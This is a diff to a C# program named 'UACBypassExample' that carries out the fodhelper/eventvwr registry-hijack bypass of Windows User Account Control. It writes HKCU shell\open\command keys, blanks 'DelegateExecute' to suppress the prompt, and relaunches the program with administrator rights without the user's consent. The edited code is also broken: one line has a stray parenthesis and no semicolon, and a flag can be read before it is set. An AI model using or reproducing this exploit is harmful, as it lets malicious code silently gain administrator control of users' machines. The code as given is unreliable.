@@ -1,11 +1,11 @@
 using System;	
 using System.Runtime.InteropServices;	// to import the libraries
-using Microsoft.Win32;					// for Registry editing
+using Microsoft.Win32;			// for Registry editing
 using System.Diagnostics;
-using System.IO; 						// to check if fodhelper exists in System32
-using System.Security.Principal;		// to check if your application is elevated.
+using System.IO;			// to check if fodhelper exists in System32
+using System.Security.Principal;	// to check if your application is elevated.
 using System.Collections.Generic;
-using System.Windows.Forms;				// where the Application class is located, which can be useful for returning the current path of your own application (Application.ExecutablePath).
+using System.Windows.Forms;		// where the Application class is located, which can be useful for returning the current path of your own application (Application.ExecutablePath).
 
 namespace UACBypassExample
 {
@@ -24,7 +24,7 @@ namespace UACBypassExample
             public string RegPath;
             public string FilePath;
 
-			// initialize 
+	    // initialize 
             public UACPath(string RegPath, string FilePath)
             {
                  this.RegPath = RegPath;
@@ -36,17 +36,27 @@ namespace UACBypassExample
         {
              List<UACPath> upath = new List<UACPath>
              {
-		          // FODHELPER METHOD: Windows 10 2016 and up.
+		  // FODHELPER METHOD: Windows 10 2016 and up.
                   new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "C:\\Windows\\System32\\fodhelper.exe" ), // 0
                   // EVENTVWR METHOD: Windows versions less than Windows 10
-		          new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command",     "C:\\Windows\\System32\\eventvwr.exe"  )  // 1
+		  new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command",     "C:\\Windows\\System32\\eventvwr.exe"  )  // 1
              };
 
              IntPtr ov = IntPtr.Zero;
 
+             bool w64 = Environment.Is64BitOperatingSystem && !Environment.Is64BitProcess, w64d;
+
              try
              {
-		          // to get the actual version, you need to embed the manifest with a <supportedOS>
+                  // use this if your program is running on 32 bit accessing 64 bit system files.
+		  // it is used to prevent redirection to SysWOW64 when trying to access something
+                  // on System32 especially if your OS is 64 bit, since both fodhelper and eventvwr
+	          // doesn't even exists there (SysWOW64) somehow.
+                  if (w64) 
+                      w64d = Imports.Wow64DisableWow64FsRedirection(out ov))
+                  
+
+		  // to get the actual version, you need to embed the manifest with a <supportedOS>
                   // entry. Otherwise Environment.OSVersion might return Windows 8 instead of 10 in newer
                   // Windows versions. That entry is created along with the manifest, you just need to
                   // remove the comment tag or <!-- .. --> within the supportedOS entry.
@@ -56,39 +66,30 @@ namespace UACBypassExample
                   if (isWin10up)
                         Registry.SetValue(upath[0].RegPath, "DelegateExecute", ""); // to disable UAC prompt in executing fodhelper.
                   
-		          // use this if your program is running on 32 bit accessing 64 bit system files.
-		          // it is used to prevent redirection to SysWOW64 when trying to access something
-                  // on System32 especially if your OS is 64 bit, since both fodhelper and eventvwr
-				  // doesn't even exists there (SysWOW64) somehow.
-                  if (Imports.Wow64DisableWow64FsRedirection(out ov))
-                  {
-					    // Open the process to start your program in higher privileges 
-					    // since both fodhelper and eventwvr will open your executable 
-					    // that is located in the registry upon execution. 
+		   // Open the process to start your program in higher privileges 
+		   // since both fodhelper and eventwvr will open your executable 
+		   // that is located in the registry upon execution. 
 					    
-					    // In older Windows versions (< Windows 10). executing eventvwr will look
-					    // for the registry where the MMC executable path is located, once found
-					    // it will open MMC with eventvwr.msc to start the UI (with elevation ofc). 
-					    // In this case, you can hijack the registry to start your program in higher privileges.
+		   // In older Windows versions (< Windows 10). executing eventvwr will look
+		   // for the registry where the MMC executable path is located, once found
+	           // it will open MMC with eventvwr.msc to start the UI (with elevation ofc). 
+		   // In this case, you can hijack the registry to start your program in higher privileges.
 					  
-					    // But in newer versions of Windows, MMC path is now hardcoded to eventvwr itself,
-					    // so hijacking the registry and starting the program is useless. So that's why fodhelper
-					    // method is used as an alternative for newer windows versions.
+		   // But in newer versions of Windows, MMC path is now hardcoded to eventvwr itself,
+	           // so hijacking the registry and starting the program is useless. So that's why fodhelper
+	           // method is used as an alternative for newer windows versions.
 
-					    // Also as I said earlier, both eventvwr and fodhelper are trusted binaries in Windows
-					    // so they can be executed with elevation without UAC prompt. But well the registry 
-					    // "DelegateExecute" in fodhelper method is needed, otherwise it will ask the UAC prompt
-					    // for elevation.
+                   // Also as I said earlier, both eventvwr and fodhelper are trusted binaries in Windows
+                   // so they can be executed with elevation without UAC prompt. But well the registry 
+	           // "DelegateExecute" in fodhelper method is needed, otherwise it will ask the UAC prompt
+		   // for elevation.
 					  
-                        Process.Start(new ProcessStartInfo()
-                        {
-                            FileName = upath[isWin10up ? 0 : 1].FilePath,
-                            CreateNoWindow = true, // optional. 
-                        }
-
-                        ).WaitForExit();
-                    }
-                    else Console.WriteLine("Failed to disable WoW64FsRedirection");
+                   Process.Start(new ProcessStartInfo()
+                   {
+                       FileName = upath[isWin10up ? 0 : 1].FilePath,
+                       CreateNoWindow = true, // optional. 
+                   }
+                   ).WaitForExit(); 
               }
               catch (Exception ex)
               {
@@ -96,9 +97,12 @@ namespace UACBypassExample
               }
               finally
               {
-		            // Reverting is somewhat important.
-                    if (!Imports.Wow64RevertWow64FsRedirection(ov))
-                        Console.WriteLine("Failed to revert WoW64FsRedirection.");
+		    if (w64 && w64d) // Reverting is somewhat important.
+                    { 
+                       if (!Imports.Wow64RevertWow64FsRedirection(ov))
+                           Console.WriteLine("Failed to revert WoW64FsRedirection.");
+                    } 
+                    else Console.WriteLine("This process is not 32-bit on a 64-bit OS or disabling wow64 redirection failed to operate.");
               }
          }
      }
@@ -109,11 +113,13 @@ namespace UACBypassExample
          {
              if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
              {
+                 MessageBox.Show("this process is elevated");
                  // do something, since your process is already elevated.
-				 //    start.whatever("blah blah blah");
+		 //    start.whatever("blah blah blah");
              }
              else
              {
+                 MessageBox.Show("this process isn't  elevated");
                  // if not, perform a UAC bypass
                  UAC.Bypass();
              }
